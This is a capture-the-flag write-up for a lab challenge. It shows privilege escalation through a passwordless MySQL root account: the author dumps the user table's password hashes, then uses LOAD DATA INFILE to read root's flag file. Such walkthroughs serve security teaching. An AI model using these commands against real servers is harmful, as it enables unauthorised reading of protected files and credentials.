# Internal

## The brief

```
This is Stage 2 of Path 3 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

Escalate your privileges and retrieve the flag out of root's home directory.

Use credentials you have gathered previously to access this challenge.

Press the Start button on the top-right to begin this challenge.
```

## SSH

We have creds from the `Orion` challenge:
```
user: Orion
pass: stars4love4life
```

## Recon

So what can we do? The machine has no `sudo` binary, our `id` is boring and no `SUID` binaries. 
```bash
orion@internal-b02dc088968f8e8d-655f7b5848-84zvp:~$ cd /
orion@internal-b02dc088968f8e8d-655f7b5848-84zvp:/$ ls
app  bin  boot  create_mysql_admin_user.sh  dev  etc  home  lib  lib64  media  mnt  mysql-setup.sh  opt  proc  root  run  run.sh  sbin  srv  start-apache2.sh  start-mysqld.sh  sys  tmp  usr  var
```
Interesting, some `MySQL` stuff.... can we logon?

```bash
orion@internal-6302da397808a1bb-6f6f845cd-stzk4:/$ cat run.sh
#!/bin/bash

VOLUME_HOME="/var/lib/mysql"

sed -ri -e "s/^upload_max_filesize.*/upload_max_filesize = ${PHP_UPLOAD_MAX_FILESIZE}/" \
    -e "s/^post_max_size.*/post_max_size = ${PHP_POST_MAX_SIZE}/" /etc/php5/apache2/php.ini
if [[ ! -d $VOLUME_HOME/mysql ]]; then
    echo "=> An empty or uninitialized MySQL volume is detected in $VOLUME_HOME"
    echo "=> Installing MySQL ..."
    mysql_install_db > /dev/null 2>&1
    echo "=> Done!"
    /create_mysql_admin_user.sh
else
    echo "=> Using an existing volume of MySQL"
fi

exec supervisord -n
orion@internal-6302da397808a1bb-6f6f845cd-stzk4:/$ cat mysql-setup.sh
#!/bin/bash

service mysql restart
sleep 5
#mysqld &
#mysqladmin --user root password ""
#mysql -e "DROP USER 'root'@'localhost'; CREATE USER 'root'@'%' IDENTIFIED BY '';GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;"
/usr/sbin/sshd -D
```
One of the comments is really usefull:
```
#mysqladmin --user root password ""
```
Time to SQL

## MySQL

Here is the initial part:
```
 mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.5.47-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```
`information_schema` and `performance_schema` are not interesting to us. But `mysql` is!
```
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
```
Ooooo, and what's in `user`? (A lot, but here are the two important columns):
```
select User, Password  from user;
+-------+-------------------------------------------+
| User  | Password                                  |
+-------+-------------------------------------------+
| root  |                                           |
| root  |                                           |
| root  |                                           |
| root  |                                           |
| admin | *29D16BAEB5F0BF7E2F8E862E3FB290C7F03F3754 |
+-------+-------------------------------------------+
5 rows in set (0.00 sec)
```
Aight... what now? That isn't a real password...

## Getting the flag

Thank you to [Maryary](https://github.com/Maryary94)! She helped me finish this challenge.
</br></br>

We know that the flag is probably in the `/root/` folder as `flag.txt`. So how can we loaded into the database to read?
```
mysql> LOAD DATA INFILE '/root/flag.txt' INTO TABLE db FIELDS TERMINATED BY '\n';
Query OK, 1 row affected, 21 warnings (0.00 sec)
Records: 1  Deleted: 0  Skipped: 0  Warnings: 21
```
Then just `select * from db;` (I won't show the whole output):
```
flag{183bdf6f145a1c97f0b4f520355e8ed5}
```
Yay!